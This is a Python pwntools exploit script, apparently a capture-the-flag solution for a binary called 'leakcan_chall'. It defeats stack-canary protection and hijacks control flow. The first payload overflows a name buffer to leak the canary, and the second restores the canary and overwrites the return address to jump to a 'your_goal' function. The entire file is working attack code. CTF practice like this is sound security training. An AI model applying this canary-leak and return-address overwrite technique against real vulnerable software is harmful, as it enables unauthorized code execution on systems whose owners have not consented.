#!/usr/bin/env python3

from pwn import *

exe = "./leakcan_chall"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

input2Canary = 0x68 - 0x10

context.log_level = "debug"
# io = gdb.debug(exe, "c")
io = process(exe)

# leak canary value
payload = flat({input2Canary: b"A"})
io.sendafter(b"name?", payload)
io.recvuntil(b"Hello! ")
io.recv(input2Canary + 1)
canary = u64(io.recv(7).rjust(8, b"\x00"))
info("canary: %#x", canary)

payload = flat({input2Canary: canary, input2Canary + 0x10: elf.sym.your_goal})
io.send(payload)
io.recvuntil(b"Good luck")
io.recvline()
success(io.recvlineS())
